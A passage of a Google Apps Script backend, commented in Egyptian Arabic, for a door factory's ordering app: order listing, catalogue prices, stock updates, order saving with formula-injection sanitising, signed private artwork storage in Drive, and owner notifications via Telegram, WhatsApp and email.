        if (isArchLW && !withArchLW) continue;   // المؤرشف مايظهرش في التقارير افتراضيًا
        var idLW = String(rowsLW[jLW][0]);
        outLW.push({
          id:        idLW,
          date:      fmtDate_(rowsLW[jLW][1]),
          dist:      rowsLW[jLW][3],
          phone:     String(rowsLW[jLW][4] || '').replace(/^'/, ''),
          region:    rowsLW[jLW][5],
          warehouse: rowsLW[jLW][6],
          status:    rowsLW[jLW][10],
          customer:  rowsLW[jLW][COL_CUSTOMER - 1] || '',
          customerPhone: String(rowsLW[jLW][COL_CUST_PHONE - 1] || '').replace(/^'/, ''),
          customerRegion: rowsLW[jLW][COL_CUST_REGION - 1] || '',
          artCompletedAt: artDateMs_(rowsLW[jLW][COL_ART_COMPLETED-1]),
          artPurgedAt: artDateMs_(rowsLW[jLW][COL_ART_PURGED-1]),
          ordNote:   rowsLW[jLW][COL_ORDNOTE  - 1] || '',
          replacesId: rowsLW[jLW][COL_REPLACES - 1] || '',
          displayNo: rowsLW[jLW][COL_DISPLAY_NO - 1] || '',
          editCount: rowsLW[jLW][COL_EDIT_COUNT - 1] || 0,
          editedAt: fmtDate_(rowsLW[jLW][COL_EDITED_AT - 1]),
          due: fmtDate_(rowsLW[jLW][COL_DUE - 1]),
          items:     itemsByIdLW[idLW] || []
        });
      }
      return reply({ ok: true, orders: outLW }, cb);
    }

    /* ---------- أسعار الكتالوج ----------
       الأسعار كانت متخزّنة في متصفح المصنع بس (localStorage). يعني لما المصنع
       يعدّل سعر، الموزّعين كلهم يفضلوا شايفين السعر القديم المكتوب جوّه التطبيق
       لحد ما تترفع نسخة جديدة منه. دلوقتي الشيت هو المصدر الواحد للأسعار:
       المصنع بيكتب فيه بكلمة السر، وكل الأجهزة بتقرا منه. */

    // القراية مفتوحة من غير كلمة سر — الأسعار أصلًا مكتوبة جوّه التطبيق نفسه
    if (action === 'prices') {
      var shPR = sheet_(SHEET_PRICES, HEAD_PRICES);
      if (shPR.getLastRow() < 2) return reply({ ok: true, prices: null, at: '' }, cb);
      var rowPR = shPR.getRange(2, 1, 1, 2).getValues()[0];
      var rawPR = String(rowPR[0] || '').trim();
      if (!rawPR) return reply({ ok: true, prices: null, at: '' }, cb);
      var objPR = null;
      try { objPR = JSON.parse(rawPR); }
      catch (ePR) { return reply({ ok: false, error: 'الأسعار المتخزّنة مش مقروءة' }, cb); }
      return reply({ ok: true, prices: objPR, at: fmtDate_(rowPR[1]) }, cb);
    }

    // الكتابة بكلمة سر المصنع بس
    if (action === 'setPrices') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var payloadPR = String(e.parameter.payload || '').trim();
      if (!payloadPR) return reply({ ok: false, error: 'مفيش أسعار مبعوتة' }, cb);
      // لازم تكون كائن JSON — كده الخانة عمرها ما تبدأ بـ = أو + فتتقري كمعادلة
      if (payloadPR.charAt(0) !== '{') return reply({ ok: false, error: 'شكل الأسعار مش صحيح' }, cb);
      // نتأكد إنها JSON صالح قبل ما نكتبها — عشان مانخزّنش حاجة تكسر كل الأجهزة
      try { JSON.parse(payloadPR); }
      catch (eSP) { return reply({ ok: false, error: 'شكل الأسعار مش صحيح' }, cb); }

      var lockPR = LockService.getScriptLock();
      try {
        lockPR.waitLock(15000);
        var shSP = sheet_(SHEET_PRICES, HEAD_PRICES);
        // صف واحد بس — الأسعار الحالية. القديم بيتكتب فوقه.
        if (shSP.getLastRow() < 2) shSP.appendRow([payloadPR, new Date()]);
        else shSP.getRange(2, 1, 1, 2).setValues([[payloadPR, new Date()]]);
        return reply({ ok: true }, cb);
      } finally {
        try { lockPR.releaseLock(); } catch (ePR2) {}
      }
    }

    // أرصدة المخزن — متاحة للعميل من غير كلمة سر عشان يشوف المتوفر
    if (action === 'stock') {
      var shST = sheet_(SHEET_STOCK, HEAD_STOCK);
      var lastST = shST.getLastRow();
      var outST = [];
      if (lastST >= 2) {
        var valsST = shST.getRange(2, 1, lastST - 1, HEAD_STOCK.length).getValues();
        for (var iST = 0; iST < valsST.length; iST++) {
          var codeST = doorCode_(valsST[iST][0]);   // الكود القديم بيترجع بالجديد
          if (!codeST) continue;
          outST.push({
            code: codeST,
            size: String(valsST[iST][1] || '').trim(),
            qty:  Number(valsST[iST][2]) || 0
          });
        }
      }
      return reply({ ok: true, stock: outST }, cb);
    }

    // تحديث رصيد صنف واحد (كود + مقاس) — من شاشة المصنع بكلمة السر
    if (action === 'setStock') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockSS = LockService.getScriptLock();
      try {
        lockSS.waitLock(15000);
        var shSS = sheet_(SHEET_STOCK, HEAD_STOCK);
        var codeSS = doorCode_(e.parameter.code);
        var sizeSS = String(e.parameter.size || '').trim();
        var qtySS  = Math.max(0, Math.round(Number(e.parameter.qty) || 0));
        if (!codeSS) return reply({ ok: false, error: 'الكود ناقص' }, cb);

        var lastSS = shSS.getLastRow();
        var foundSS = -1;
        if (lastSS >= 2) {
          var rowsSS = shSS.getRange(2, 1, lastSS - 1, 2).getValues();
          for (var jSS = 0; jSS < rowsSS.length; jSS++) {
            if (doorCode_(rowsSS[jSS][0]) === codeSS &&
                String(rowsSS[jSS][1]).trim() === sizeSS) { foundSS = jSS + 2; break; }
          }
        }
        if (foundSS > 0) {
          shSS.getRange(foundSS, COL_STOCK_QTY).setValue(qtySS);
          shSS.getRange(foundSS, COL_STOCK_UPDATED).setValue(new Date());
        } else {
          shSS.appendRow([codeSS, sizeSS, qtySS, new Date()]);
        }
        return reply({ ok: true, code: codeSS, size: sizeSS, qty: qtySS }, cb);
      } finally {
        try { lockSS.releaseLock(); } catch (eSS) {}
      }
    }

    return reply({ ok: false, error: 'Unknown action' }, cb);

  } catch (err) {
    logError_(err);
    return reply({ ok: false, error: String(err) }, cb);
  }
}

/* ============================================================
   الكتابة في الشيت
   ============================================================ */
function saveOrder_(o) {
  assertLegacySubmission294_(o.id);
  validateOrderArtwork_(o);
  var when  = o.ts ? new Date(o.ts) : new Date();
  var dateS = Utilities.formatDate(when, TZ, 'yyyy-MM-dd');
  var timeS = Utilities.formatDate(when, TZ, 'HH:mm');

  var items = o.items || [];
  var qty = 0;   // أبواب وإكسسوارات بس — العيدان ليها عمود لوحدها
  var rods = 0;
  for (var i = 0; i < items.length; i++) {
    var k = items[i].kind;
    // بنود الخدمة (قص/تدعيم) تسعير مش قطع بتتصنّع — مابتتعدّش في عدد القطع
    if (isServiceCode_(items[i].code)) continue;
    if (k === 'frame' || k === 'bror') rods += (items[i].isSet ? (Number(items[i].qty)||0)*3 : Number(items[i].qty) || 0);
    else qty += Number(items[i].qty) || 0;
  }

  // ---- سطر الملخّص ----
  var shO = sheet_(SHEET_ORDERS, HEAD_ORDERS);

  // لو الطلب اتبعت مرتين بالغلط، بنحدّث السطر القديم بدل ما نكرّره
  var existing = findRow_(shO, o.id);
  var rowO = [
    o.id,
    dateS,
    timeS,
    sanitizeCell_(o.name || ''),
    "'" + (o.phone || ''),   // الفاصلة العليا بتخلي الرقم نص عشان الصفر ما يتقصّش
    o.region || '',
    warehouseEn_(o.warehouse),
    qty,
    rods,
    Number(o.total) || 0,
    'New',
    '',            // ملاحظة المصنع — تتكتب بالإيد
    PRICE_NOTE,
    o.msg || '',
    '',                  // Status Updated — بيتحط وقت تغيير الحالة
    '',                  // Archived
    sanitizeCell_(o.customer || ''),    // صاحب الأوردر لو مختلف عن صاحب الجهاز
    sanitizeCell_(o.note || ''),        // ملاحظات العميل
    o.customerPhone || ''  // تليفون صاحب الأوردر لو مختلف عن صاحب الجهاز
  ];

  rowO = sanitizeRow_(rowO);   // كل خانة نصية تتنظّف من الصيغ قبل ما تدخل الشيت

  if (existing > 0) {
    // بنحافظ على الحالة والملاحظة اللي المصنع كتبها، ونحدّث الباقي بس
    var keep = shO.getRange(existing, COL_STATUS, 1, 2).getValues()[0];
    if (keep[0]) rowO[COL_STATUS - 1] = keep[0];
    if (keep[1]) rowO[COL_NOTE   - 1] = keep[1];
    shO.getRange(existing, 1, 1, rowO.length).setValues([rowO]);
  } else {
    shO.appendRow(rowO);
  }

  // عمود "Replaces Order" (٢١) بيتكتب لوحده — عشان الرينج اللي فوق (rowO.length = ١٩ عمود)
  // منلمسش عمود Superseded (٢٠) اللي بيتحط بمنطق تاني في cancelOrder
  var rowIdxRepl = existing > 0 ? existing : shO.getLastRow();
  shO.getRange(rowIdxRepl, COL_REPLACES).setValue(sanitizeCell_(o.replacesId || ''));
  // عنوان صاحب الأوردر (عمود ٢٦) — بيتكتب لوحده زي Replaces Order عشان رينج rowO الأساسي ميتغيّرش
  shO.getRange(rowIdxRepl, COL_CUST_REGION).setValue(sanitizeCell_(o.customerRegion || ''));

  // رقم الطلب "العادي" (Display No) + عدد مرات التعديل:
  // لو ده تعديل وجالنا رقم موروث من الطلب القديم (o.displayNo) بنستخدمه زي ما هو ونزوّد عداد التعديل،
  // ولو طلب جديد بالكامل بنطلب رقم تسلسلي جديد من nextOrderDisplayNo_.
  var displayNo = o.displayNo ? Number(o.displayNo) : 0;
  var editCount = Number(o.editCount) || 0;
  // ⚠️ باج: الطلب اللي اتبعت تاني (إعادة إرسال أو محاولة من طابور الانتظار) كان
  // بياخد رقم تسلسلي جديد كل مرة. ده بيحصل بجد: الطلب الكبير بيتبعت بـ POST
  // والرد مش بيوصل للتطبيق، فالتطبيق ما يعرفش الرقم ويعيد الإرسال من غيره —
  // فالرقم اللي المصنع شايفه على الورق يتغيّر، وأرقام بتتحرق على الفاضي.
  // الصف موجود خلاص وله رقم، فبناخد رقمه هو.
  if (!displayNo && existing > 0) {
    var oldNo = shO.getRange(existing, COL_DISPLAY_NO, 1, 2).getValues()[0];
    if (Number(oldNo[0])) {
      displayNo = Number(oldNo[0]);
      if (!editCount) editCount = Number(oldNo[1]) || 0;
    }
  }
  if (!displayNo) {
    displayNo = nextOrderDisplayNo_(shO);
    editCount = 0;
  }
  shO.getRange(rowIdxRepl, COL_DISPLAY_NO, 1, 2).setValues([[displayNo, editCount]]);
  // تاريخ التعديل: بيتكتب بس لو ده تعديل فعلي (editCount > 0) وجالنا تاريخ من التطبيق
  if (editCount > 0 && o.editedAt) {
    shO.getRange(rowIdxRepl, COL_EDITED_AT).setValue(sanitizeCell_(String(o.editedAt)));
  }

  // ---- ميعاد التسليم ----
  // الطلب الجديد: اللي جه من التطبيق، وإلا تاريخ الطلب + ١٤ يوم.
  // الطلب اللي بدل تعديل: بياخد ميعاد الطلب القديم (المصنع يمكن يكون عدّله).
  // إعادة إرسال لطلب موجود: ما نكتبش فوق ميعاد المصنع غير لو الخانة فاضية.
  var dueNow = existing > 0 ? fmtDate_(shO.getRange(rowIdxRepl, COL_DUE).getValue()) : '';
  var dueS = dueNow;
  if (!dueS) {
    if (o.replacesId) {
      var rOld = findRow_(shO, o.replacesId);
      if (rOld > 0) dueS = fmtDate_(shO.getRange(rOld, COL_DUE).getValue());
    }
    if (!dueS) dueS = cleanIsoDate_(o.dueDate);
    if (!dueS) dueS = addDaysIso_(dateS, DUE_DEFAULT_DAYS_);
    shO.getRange(rowIdxRepl, COL_DUE).setValue(dueS);
  }

  // ---- سطور التفاصيل ----
  var shI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
  clearItemRows_(shI, o.id);   // لو الطلب اتحدّث، بنمسح سطوره القديمة الأول

  var lines = [];
  for (var j = 0; j < items.length; j++) {
    var it = items[j];
    var isDoor = it.kind === 'door';

    var isRod = (it.kind === 'frame' || it.kind === 'bror');

    // الباب: سعره بس — الحلق اللي جاي معاه مواصفة من غير سعر.
    // الحلق والبرور الإضافي: بيتباعوا بالعود (2.15 م) والسعر سعر العود.
    var unitPrice = isDoor ? (Number(it.unitPrice) || 0) : (Number(it.price) || 0);
    // ⚠️ سعر العود المتوسط بقى بأربع خانات عشرية، فحاصل الضرب كان بيتكتب في
    // الشيت 7199.499999999999. الفلوس بالقرش — بنقرّب هنا وفي إعادة الحساب.
    var lineTotal = Math.round(unitPrice * (Number(it.qty) || 0) * 100) / 100;

    var type = isDoor ? 'Door'
             : (it.kind === 'frame' ? 'Frame'
             : (it.kind === 'bror'  ? 'Bror'
             : (it.kind === 'mabra' ? 'Mabra'
             : (it.kind === 'panel' ? 'Panel'
             : (it.kind === 'strip' ? 'Strip'
             : (it.kind === 'veneer' ? 'Veneer' : 'Accessory'))))));

    // ⚠️ السطر المدموج فيه أعواد بأطوال مختلفة (قوائم + عوارض). كتابة
    // 'rod 200cm' عليه بتكدب على ٣ أعواد من التسعة. بنكتب 'rods' من غير طول —
    // والأطوال مكتوبة في عمود المقاس (spec) بالتفصيل.
    var unit = isDoor ? 'door'
             : (it.isSet ? 'set'
             : (it.customSet ? 'rods'
             : (isRod ? ('rod ' + (it.rodCm || 220) + 'cm') : (it.unit || 'pc'))));

    lines.push([
      o.id,
      dateS,
      sanitizeCell_(o.name || ''),
      type,
      it.titleEn || it.title || '',            // النسخة الإنجليزية أولاً
      it.code || '',
      isDoor ? (it.sizeEn || it.sizeTxt || '') : (it.spec || ''),
      isDoor ? [ (it.frame ? it.frame + ' cm frame' + (it.frameHeight ? ' (h:' + it.frameHeight + 'cm)' : '') : ''),
                 (it.dbror ? 'bror ' + it.dbror : '') ]
               .filter(function(x){ return x; }).join(' + ')
               + ((it.frame || it.dbror) ? ' (included, no charge)' : '') : '',
      isDoor ? (it.millEn || '') : '',
      unit,
      Number(it.qty) || 0,
      unitPrice,
      lineTotal,
      'Y',
      isDoor ? (it.frame || '') : '',
      isDoor ? (it.dbror || '') : '',
      isDoor ? (it.frameHeight || '') : '',
      isDoor ? (it.w || '') : '',
      0,   // Produced Qty — يبدأ صفر لكل صنف جديد، وبيتحدّث بعدين من شاشة المصنع
      (isDoor || String(it.code||'') === CUT_SERVICE_CODE_) ? (it.doorHeight || '') : '',
      isRod ? (it.doorW || '') : '',      // الحلق/البرور ده لباب مقاس كام (اختياري)
      sanitizeCell_(it.note || ''),        // ملاحظة حرة على الصنف (اختياري)
      isDoor ? String(it.printArt || '') : '',
      isDoor ? String(it.engraveArt || '') : '',   // صورة الطباعة — كود ملف الدرايف (للأبواب المطبوعة بس)
      0   // Received Qty — يبدأ صفر لكل صنف جديد (COL_ITEM_RECEIVED)
    ]);
  }

  if (lines.length) {
    shI.getRange(shI.getLastRow() + 1, 1, lines.length, HEAD_ITEMS.length)
       .setValues(lines.map(sanitizeRow_));   // نفس التنظيف على كل سطر صنف
  }

  // ---- خصم الرصيد ----
  // بيتخصم بس لما الطلب يتكتب أول مرة (مش لو ده إعادة إرسال لنفس رقم الطلب بالغلط،
  // زي محاولة تانية بعد انقطاع نت — عشان الرصيد ما يتخصمش مرتين للطلب نفسه)
  if (existing < 0) {
    adjustStockForItems_(items, -1);
  }

  // إشعار للمالك بالطلب الجديد (تليجرام / واتساب CallMeBot / إيميل) — أول مرة بس، وأي عطل
  // فيه مايفشّلش الطلب أبدًا.
  if (existing < 0) {
    try { notifyNewOrder_(o, displayNo, editCount, qty, rods, dueS); } catch (eN) { logError_(eN); }
  }

  return { displayNo: displayNo, editCount: editCount, due: dueS };
}

/* ============================================================
   إشعار الطلب الجديد
   بيتظبط من Project Settings ← Script Properties (من غير ما أي كلمة سر تتكتب في الكود):
   - تليجرام (الأفضل: إشعار فوري على الموبايل): TELEGRAM_TOKEN + TELEGRAM_CHAT_ID
   - واتساب عن طريق CallMeBot: CALLMEBOT_PHONE + CALLMEBOT_KEY
   - إيميل: NOTIFY_EMAIL
   أي قناة مش مظبوطة بتتخطّى بصمت. جرّب بتشغيل testNotify من المحرر (هيطلب صلاحيات أول مرة).
   ============================================================ */
/* v206 proposed private artwork storage. No Drive sharing or caller-supplied file IDs. */
function artRefValid_(ref){return /^pa_[a-f0-9]{32}$/.test(String(ref||''));}
function artOrderValid_(id){return /^[A-Za-z0-9_-]{1,60}$/.test(String(id||''));}
function artRegistryName_(orderId,ref){return 'registry_'+orderId+'_'+ref+'.json';}
function artFind_(orderId,ref,readOnly){
  if(!artOrderValid_(orderId)||!artRefValid_(ref))return null;
  var folder;
  if(readOnly){var folderId=PropertiesService.getScriptProperties().getProperty('PRINT_PRIVATE_FOLDER_ID');if(!folderId)return null;folder=DriveApp.getFolderById(folderId);if(folder.getSharingAccess()!==DriveApp.Access.PRIVATE||folder.getViewers().length||folder.getEditors().length)throw Error('ART_FOLDER_NOT_PRIVATE');}
  else folder=artPrivateFolder_();
  var files=folder.getFilesByName(artRegistryName_(orderId,ref));
  if(!files.hasNext())return null;
  var f=files.next();
  if(f.isTrashed()||f.getSharingAccess()!==DriveApp.Access.PRIVATE||f.getViewers().length||f.getEditors().length)throw new Error('سجل التصميم غير متاح بشكل خاص');
  var bytes=f.getBlob();if(bytes.getBytes().length>8192)throw new Error('سجل التصميم غير صالح');
  var row=JSON.parse(bytes.getDataAsString('UTF-8'));
  if(!Array.isArray(row)||String(row[0])!==String(orderId)||String(row[1])!==String(ref)||!/^[a-f0-9]{64}$/.test(String(row[4]||'')))throw new Error('سجل التصميم غير صالح');
  return row;
}
function artHex_(bytes){return bytes.map(function(b){return ('0'+((b+256)%256).toString(16)).slice(-2);}).join('');}
function artMac_(key,text){return artHex_(Utilities.computeHmacSha256Signature(String(text),String(key),Utilities.Charset.UTF_8));}
function artEqual_(a,b){a=String(a||'');b=String(b||'');var diff=a.length^b.length;for(var i=0;i<Math.max(a.length,b.length);i++)diff|=(a.charCodeAt(i)||0)^(b.charCodeAt(i)||0);return diff===0;}
function artSigned_(row,action,p){
  if(!row||!/^\d{13}$/.test(String(p.ts||''))||Math.abs(Date.now()-Number(p.ts))>120000||!/^[a-f0-9]{32}$/.test(String(p.nonce||'')))return false;
  var expected=artMac_(row[4],[action,row[0],row[1],p.ts,p.nonce].join('|'));
  if(!artEqual_(expected,p.proof))return false;
  // A captured, short-lived signature is not a reusable design credential.
  var cache=CacheService.getScriptCache(),key='art_nonce_'+p.nonce;
  if(cache.get(key))return false;cache.put(key,'1',180);return true;
}
function artPrivateFolder_(){
  var props=PropertiesService.getScriptProperties(),id=props.getProperty('PRINT_PRIVATE_FOLDER_ID'),folder;
  if(id)folder=DriveApp.getFolderById(id);
  else{folder=DriveApp.createFolder('WPC Private Order Artwork');props.setProperty('PRINT_PRIVATE_FOLDER_ID',folder.getId());}
  if(folder.getSharingAccess()!==DriveApp.Access.PRIVATE||folder.getViewers().length||folder.getEditors().length)throw new Error('مجلد صور الطباعة يجب أن يظل خاصًا بحساب المصنع');
  return folder;
}
function artDecode_(data,maxBytes){
  var m=/^data:(image\/(?:png|jpeg|webp));base64,([A-Za-z0-9+/=]+)$/.exec(String(data||''));
  if(!m||m[2].length>Math.ceil(maxBytes/3)*4+8)throw new Error('صورة الطباعة غير صالحة أو أكبر من المسموح');
  var bytes=Utilities.base64Decode(m[2]);if(!bytes.length||bytes.length>maxBytes)throw new Error('حجم صورة الطباعة أكبر من المسموح');
  // Check magic bytes, not only the supplied MIME header.
  var sig=bytes.slice(0,12).map(function(b){return (b+256)%256;});
  var valid=m[1]==='image/jpeg'?sig[0]===255&&sig[1]===216&&sig[2]===255:
    m[1]==='image/png'?sig[0]===137&&sig[1]===80&&sig[2]===78&&sig[3]===71&&sig[4]===13&&sig[5]===10&&sig[6]===26&&sig[7]===10:
    sig[0]===82&&sig[1]===73&&sig[2]===70&&sig[3]===70&&sig[8]===87&&sig[9]===69&&sig[10]===66&&sig[11]===80;
  if(!valid)throw new Error('محتوى ملف الطباعة ليس صورة صالحة');return {mime:m[1],bytes:bytes};
}
function uploadPrintPrivate_(b){
  if(PropertiesService.getScriptProperties().getProperty('ART_RETENTION_POLICY')!=='READY_72H_PERMANENT_V1')throw new Error('سياسة حفظ التصميمات غير مفعّلة؛ أعد المحاولة بعد تحديث المصنع');
  if(artExpired_(b.orderId))throw new Error('انتهت مدة حفظ تصميمات هذا الطلب؛ لا يمكن إعادة رفعها لنفس الطلب');
  if(!artOrderValid_(b.orderId)||!artRefValid_(b.ref)||!/^[a-f0-9]{64}$/.test(String(b.key||'')))throw new Error('بيانات إرفاق الطباعة غير صالحة');
  var original=artDecode_(b.data,5*1024*1024),preview=artDecode_(b.thumb,1024*1024);
  var hash=artHex_(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256,original.bytes));
  var prior=artFind_(b.orderId,b.ref,true);
  if(prior){if(!artEqual_(prior[4],b.key)||!artEqual_(prior[5],hash))throw new Error('مرجع الطباعة مستخدم بتصميم مختلف');return {ok:true,ready:true};}
  assertLegacyCreate294_(b.orderId);
  var props=PropertiesService.getScriptProperties(),day=Utilities.formatDate(new Date(),'UTC','yyyy-MM-dd');
  var budgetKey='ART_BYTES_TODAY',countKey='ART_COUNT_TODAY';
  var sameDay=props.getProperty('ART_BUDGET_DAY')===day;
  var used=sameDay?Number(props.getProperty(budgetKey)||0):0,count=sameDay?Number(props.getProperty(countKey)||0):0,size=original.bytes.length+preview.bytes.length;
  if(used+size>200*1024*1024||count>=200)throw new Error('تم بلوغ حد رفع الصور اليومي؛ الملفات محفوظة على الجهاز');
  props.setProperty('ART_BUDGET_DAY',day);props.setProperty(budgetKey,String(used+size));props.setProperty(countKey,String(count+1));
  var folder=artPrivateFolder_(),f=null,t=null,registry=null;
  try{
    f=folder.createFile(Utilities.newBlob(original.bytes,original.mime,b.ref));
    f.setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|original');
    t=folder.createFile(Utilities.newBlob(preview.bytes,preview.mime,b.ref+'_preview'));
    t.setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|preview');
    if(f.getSharingAccess()!==DriveApp.Access.PRIVATE||t.getSharingAccess()!==DriveApp.Access.PRIVATE)throw new Error('تعذّر ضمان خصوصية ملف الطباعة');
    var record=[b.orderId,b.ref,f.getId(),t.getId(),b.key,hash,size,Date.now()];
    registry=folder.createFile(Utilities.newBlob(JSON.stringify(record),'application/json',artRegistryName_(b.orderId,b.ref)));
    registry.setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|registry');
    if(registry.getSharingAccess()!==DriveApp.Access.PRIVATE)throw new Error('تعذّر ضمان خصوصية سجل التصميم');
  }catch(e){
    var temporary=[[registry,artRegistryName_(b.orderId,b.ref),'registry'],[t,b.ref+'_preview','preview'],[f,b.ref,'original']];
    for(var rollback=0;rollback<temporary.length;rollback++){
      var part=temporary[rollback];if(!part[0])continue;
      try{part[0].setDescription('WPC_ART_V1|'+b.orderId+'|'+b.ref+'|'+part[2]);artPermanentlyRemove_(part[0].getId(),part[1],'WPC_ART_V1|'+b.orderId+'|'+b.ref+'|'+part[2],folder.getId());}
      catch(rollbackError){props.setProperty('ART_UPLOAD_ROLLBACK_FAILED','1');}
    }
    throw new Error('تعذّر حفظ صورة الطباعة بشكل خاص؛ أعد المحاولة');
  }
  return {ok:true,ready:true};
}
function artLinked_(orderId,ref){
  var sh=sheet_(SHEET_ITEMS,HEAD_ITEMS),rows=itemRowsFor_(sh,orderId).rows;
  for(var i=0;i<rows.length;i++)if(String(rows[i][22]||'')===String(ref)||String(rows[i][23]||'')===String(ref))return true;
  return false;
}
function handlePrivateArt_(action,p){
  var row=artFind_(String(p.orderId||''),String(p.ref||''));
  var factory=!!p.pw&&checkAdminPw_(p.pw,p.dev);
  var own=!factory&&row&&artSigned_(row,action,p);
  if(!row&&factory&&artExpired_(p.orderId))return {ok:false,expired:true,error:'انتهت مدة حفظ التصميم بعد ٣ أيام من جاهز للتحميل'};
  if(!row||(!factory&&!own))return {ok:false,error:'ملف الطباعة غير متاح بهذه الصلاحية'};
  if(artExpired_(row[0]))return {ok:false,expired:true,error:'انتهت مدة حفظ التصميم بعد ٣ أيام من جاهز للتحميل'};
  var privateFolder=artPrivateFolder_();
  for(var fileIndex=2;fileIndex<=3;fileIndex++){
    var checkFile=DriveApp.getFileById(String(row[fileIndex])),parentIt=checkFile.getParents(),inside=false;
    while(parentIt.hasNext())if(parentIt.next().getId()===privateFolder.getId())inside=true;
    if(!inside||checkFile.isTrashed()||checkFile.getSharingAccess()!==DriveApp.Access.PRIVATE||checkFile.getViewers().length||checkFile.getEditors().length)return {ok:false,error:'ملف التصميم غير متاح بشكل خاص'};
  }
  var linked=artLinked_(row[0],row[1]);
  if(action==='printStatus')return {ok:true,ready:true,linked:linked};
  if(!linked)return {ok:false,error:'ملف الطباعة لم يرتبط بطلب محفوظ بعد'};
  var folder=artPrivateFolder_(),file=DriveApp.getFileById(String(p.original)==='1'?row[2]:row[3]);
  var parents=file.getParents(),inFolder=false;while(parents.hasNext())if(parents.next().getId()===folder.getId())inFolder=true;
  if(!inFolder||file.isTrashed()||file.getSharingAccess()!==DriveApp.Access.PRIVATE)return {ok:false,error:'ملف الطباعة غير متاح بشكل خاص'};
  var blob=file.getBlob(),bytes=blob.getBytes();if(bytes.length>5*1024*1024)return {ok:false,error:'ملف الطباعة أكبر من المسموح'};
  return {ok:true,dataUrl:'data:'+blob.getContentType()+';base64,'+Utilities.base64Encode(bytes)};
}
function validateOrderArtwork_(o){
  var items=o.items||[],proofs=o.artProofs||{},known={},i;
  for(i=0;i<items.length;i++){
    var it=items[i];if(it.kind!=='door')continue;
    var title=String(it.title||'')+String(it.titleEn||'');
    var fields=[['printArt',!!it.print||/\(طباعة\)|\(Print\)/i.test(title),'الطباعة'],['engraveArt',!!it.hafr||/\(حفر\)|\(Carved\)/i.test(title),'الحفر']];
    for(var j=0;j<fields.length;j++){
      var field=fields[j][0],ref=String(it[field]||'');
      // رفع صورة الرسمة اختياري بطلب صريح من صاحب العمل: باب عليه طباعة/حفر بدون
      // مرفق يُقبل بالكود والوصف، والمصنع عنده كتالوج الرسومات المعتمدة. الرفض يفضل
      // ساريًا لمرفق غير صالح أو غير مثبت، ولمنع حذف مرفقات طلب محفوظ.
      if(!ref)continue;
      if(!artRefValid_(ref))throw new Error('مرجع صورة التصميم غير صالح');
      var row=artFind_(o.id,ref);
      if(!row||!artEqual_(proofs[ref],artMac_(row[4],['attach',o.id,ref].join('|'))))throw new Error('التصميم غير مرفوع لهذا الطلب أو صلاحية إرفاقه غير صحيحة');
      known[ref]=true;
    }
  }
  var existing=itemRowsFor_(sheet_(SHEET_ITEMS,HEAD_ITEMS),o.id).rows;
  for(i=0;i<existing.length;i++)for(var c=22;c<=23;c++)if(existing[i][c]&&!known[String(existing[i][c])])throw new Error('لا يمكن حذف مرفق تصميم من طلب محفوظ عبر نسخة قديمة');
}

function notifyNewOrder_(o, displayNo, editCount, qty, rods, dueS) {
  var props = PropertiesService.getScriptProperties();
  var no = displayNo ? ('#' + displayNo + (editCount > 0 ? '/' + editCount : '')) : ('#' + o.id);
  var lines = [
    (o.replacesId ? '🔁 تعديل على طلب — ' : '📥 طلب جديد ') + no,
    'الموزّع: ' + (o.name || '—') + (o.phone ? ' (' + o.phone + ')' : ''),
  ];
  if (o.customer) lines.push('صاحب الأوردر: ' + o.customer);
  if (o.customerRegion) lines.push('عنوان العميل: ' + o.customerRegion);
  lines.push('القطع: ' + qty + (rods ? ' + ' + rods + ' عود' : '') + ' — الإجمالي: ' + (Number(o.total) || 0));
  lines.push('ميعاد التسليم: ' + dueS);
  var text = lines.join('\n');

  var tgT = props.getProperty('TELEGRAM_TOKEN'), tgC = props.getProperty('TELEGRAM_CHAT_ID');
  if (tgT && tgC) {
    try {
      UrlFetchApp.fetch('https://api.telegram.org/bot' + tgT + '/sendMessage', {
        method: 'post', muteHttpExceptions: true,
        payload: { chat_id: tgC, text: text }
      });
    } catch (e1) { logError_(e1); }
  }
  var cbP = props.getProperty('CALLMEBOT_PHONE'), cbK = props.getProperty('CALLMEBOT_KEY');
  if (cbP && cbK) {
    try {
      UrlFetchApp.fetch('https://api.callmebot.com/whatsapp.php?phone=' + encodeURIComponent(cbP)
        + '&text=' + encodeURIComponent(text) + '&apikey=' + encodeURIComponent(cbK), { muteHttpExceptions: true });
    } catch (e2) { logError_(e2); }
  }
  var mail = props.getProperty('NOTIFY_EMAIL');
  if (mail) {
    try { MailApp.sendEmail(mail, 'طلب جديد ' + no, text); } catch (e3) { logError_(e3); }
  }
}
// شغّلها من المحرر مرة واحدة: بتطلب الصلاحيات وبتبعت رسالة تجربة على القنوات المظبوطة
function testNotify() {
  notifyNewOrder_({ name: 'تجربة', phone: '0100000000', total: 0 }, 0, 0, 1, 0, addDaysIso_(Utilities.formatDate(new Date(), TZ, 'yyyy-MM-dd'), DUE_DEFAULT_DAYS_));
}

// بيرجّع رصيد أصناف طلب (قبل ما سطوره تتمسح) — بتتنادى من cancelOrder و deleteOrder
// بيعيد حساب إجماليات طلب (الكمية / عدد العيدان / المبلغ الكلي) من سطور Order_Items بتاعته
// ويحدّثهم في سطر الطلب بتبويب Orders — بتتنادى بعد أي تعديل يدوي على كمية/حذف صنف من شاشة المصنع
// ⚠️ بند «خدمة قص» كميته مربوطة بأبواب المقاس الخاص/الارتفاع غير الاستاندر.
// المصنع بيقدر يحذف باب أو ينقّص كميته من شاشته — والبند كان بيفضل بكميته
// القديمة، يعني العميل بيدفع قص لأبواب مش موجودة. الدالة دي بتعيد ضبط كمية
// بنود القص من الأبواب الموجودة فعليًا في الطلب، وبتمسح البند لو مبقاش ليه
// أبواب. بتتنادى بعد أي تعديل كمية أو حذف صنف.
function doorRowNeedsCut_(size, doorHeight) {
  if (/\(custom\)/i.test(String(size || ''))) return true;
  var h = Number(doorHeight) || 0;
  return !!h && h !== DOOR_STD_HEIGHT_;
}
function cutRowKey_(size, doorHeight) {
  return String(size || '') + '|' + (Number(doorHeight) || '');
}
// بترجّع عدد السطور اللي اتغيّرت — التطبيق محتاج يعرف عشان يرمي نسخته
